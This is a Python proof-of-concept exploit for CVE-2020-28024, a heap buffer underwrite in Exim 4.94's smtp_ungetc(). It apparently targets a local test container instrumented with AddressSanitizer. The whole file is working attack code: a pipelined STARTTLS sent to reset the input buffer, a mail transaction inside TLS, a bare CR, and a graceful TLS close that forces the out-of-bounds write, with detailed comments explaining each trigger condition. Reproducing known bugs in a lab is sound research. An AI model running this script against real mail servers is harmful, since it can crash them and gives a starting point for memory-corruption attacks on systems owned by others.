#!/usr/bin/env python3
"""PoC for CVE-2020-28024 - Exim 4.94 heap buffer UNDERWRITE in smtp_ungetc().

Vulnerability (src/smtp_in.c):

    int smtp_ungetc(int ch) { *--smtp_inptr = ch; return ch; }

When ``smtp_inptr == smtp_inbuffer`` and EOF (-1) is pushed back through
``receive_ungetc()`` (the bare-CR header path in receive.c ~line 1957),
the decrement writes ``smtp_inbuffer[-1]`` -> heap-buffer-overflow WRITE,
caught natively by AddressSanitizer.

Reaching ``smtp_inptr == smtp_inbuffer`` while ``receive_ungetc`` is the
cleartext ``smtp_ungetc`` requires (per Qualys 2021-05 advisory):

  1. Cleartext: EHLO, then STARTTLS. STARTTLS resets the input buffer so
     ``smtp_inptr = smtp_inbuffer``.
  2. Inside TLS: EHLO, MAIL FROM, RCPT TO, DATA -> enter receive_msg()
     header reading. ``receive_getc`` is tls_getc here.
  3. Send a bare CR ('\\r') as the start of a header line, then abruptly
     drop the TLS connection (close the TCP socket). tls_getc hits a read
     error; on the revert path tls_close() restores
     ``receive_getc = smtp_getc`` and ``receive_ungetc = smtp_ungetc``
     while ``smtp_inptr`` is still ``== smtp_inbuffer``.
  4. The bare-CR handler then calls ``receive_ungetc(EOF)`` == smtp_ungetc(-1)
     -> ``*--smtp_inptr`` underwrites smtp_inbuffer[-1].

Proof = AddressSanitizer "heap-buffer-overflow WRITE" naming smtp_ungetc
in the container's docker logs (the per-connection child crashes).

Usage:
    python3 poc_cve_2020_28024.py [host] [port]
    (defaults: 127.0.0.1 18030)
"""

import socket
import ssl
import sys
import time


def recv_banner(sock, timeout=5.0):
    sock.settimeout(timeout)
    try:
        data = sock.recv(4096)
    except socket.timeout:
        return b""
    return data


def send_line(sock, line):
    if isinstance(line, str):
        line = line.encode()
    sock.sendall(line + b"\r\n")


def read_reply(sock, timeout=5.0):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            # crude: stop once we have a full SMTP reply line
            if b"\r\n" in data:
                break
    except socket.timeout:
        pass
    return b"".join(chunks)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 18030

    print(f"[*] Connecting to {host}:{port}")
    raw = socket.create_connection((host, port), timeout=10)

    banner = recv_banner(raw)
    print(f"[<] banner: {banner!r}")

    # ---- Cleartext EHLO ----
    send_line(raw, "EHLO attacker.example")
    print(f"[<] EHLO reply: {read_reply(raw)!r}")

    # ---- STARTTLS, with PIPELINED trailing bytes ----
    # The buffer-pointer reset `smtp_inend = smtp_inptr = smtp_inbuffer` in
    # smtp_in.c only fires when receive_smtp_buffered() is true after STARTTLS,
    # i.e. when there is leftover cleartext input past the STARTTLS line. The
    # server advertises X_PIPE_CONNECT / PIPELINING, so we pipeline an extra
    # junk byte in the SAME cleartext write as STARTTLS. That forces
    # smtp_inptr == smtp_inbuffer, which then persists (untouched by the TLS
    # path, which uses ssl_xfer_buffer) until tls_close reverts receive_ungetc
    # back to smtp_ungetc.
    print("[*] Sending STARTTLS with a pipelined trailing byte (forces buffer reset)")
    raw.sendall(b"STARTTLS\r\nX\r\n")
    print(f"[<] STARTTLS reply: {read_reply(raw)!r}")

    # ---- TLS handshake ----
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Be permissive: the cert is a throwaway self-signed RSA key.
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    tls = ctx.wrap_socket(raw, server_hostname="localhost")
    print(f"[*] TLS established: {tls.version()} {tls.cipher()}")

    # ---- Inside TLS: drive a mail transaction into the DATA header phase ----
    send_line(tls, "EHLO attacker.example")
    print(f"[<] (tls) EHLO reply: {read_reply(tls)!r}")

    send_line(tls, "MAIL FROM:<a@attacker.example>")
    print(f"[<] (tls) MAIL reply: {read_reply(tls)!r}")

    send_line(tls, "RCPT TO:<root@cve.local>")
    print(f"[<] (tls) RCPT reply: {read_reply(tls)!r}")

    send_line(tls, "DATA")
    print(f"[<] (tls) DATA reply: {read_reply(tls)!r}")

    # Now in receive_msg() header reading. Send a single BARE CR (0x0d) as the
    # start of the (header) line. receive.c reads it as ch=='\r' and then does
    # ONE more receive_getc() expecting the byte after the CR (line ~1947).
    print("[*] Sending a bare CR (0x0d) with no following byte...")
    tls.sendall(b"\r")
    time.sleep(0.3)

    # ---- GRACEFUL TLS shutdown (close_notify), THEN close TCP. ----
    #
    # The next receive_getc() call (the byte-after-CR read) must:
    #   1. hit tls_refill(), where SSL_read sees our close_notify and returns
    #      SSL_ERROR_ZERO_RETURN -> tls_refill() calls tls_close(TLS_NO_SHUTDOWN),
    #      which reverts receive_getc/receive_ungetc to smtp_getc/smtp_ungetc
    #      WITHOUT setting ssl_xfer_error;
    #   2. fall through (ssl_xfer_error == FALSE) to smtp_getc(), which read()s
    #      the now-closed TCP socket -> 0 bytes -> EOF.
    # That EOF is returned to receive.c line ~1947, then line ~1957 pushes it
    # back via receive_ungetc(EOF) == smtp_ungetc(-1). With smtp_inptr ==
    # smtp_inbuffer (forced by the pipelined-STARTTLS reset), *--smtp_inptr
    # underwrites smtp_inbuffer[-1].
    #
    # An abortive RST instead yields SSL_ERROR_SYSCALL (ssl_xfer_error=TRUE),
    # which takes the "lost connection" path and does NOT trigger the bug, so a
    # CLEAN close_notify is required here.
    print("[*] Graceful TLS close_notify, then closing TCP...")
    try:
        unwrapped = tls.unwrap()  # sends close_notify
    except OSError:
        unwrapped = None
    time.sleep(0.2)
    try:
        (unwrapped or raw).shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    try:
        (unwrapped or raw).close()
    except OSError:
        pass
    try:
        raw.close()
    except OSError:
        pass

    print()
    print("[*] PoC sequence sent.")
    print("[*] Inspect the container for the AddressSanitizer report:")
    print("      docker logs <container>  2>&1 | grep -A40 'heap-buffer-overflow'")
    print("    Expect: 'WRITE ... heap-buffer-overflow' with smtp_ungetc in the")
    print("    top frames (src/smtp_in.c). Confirm crash with:")
    print("      docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}}' <container>")


if __name__ == "__main__":
    main()
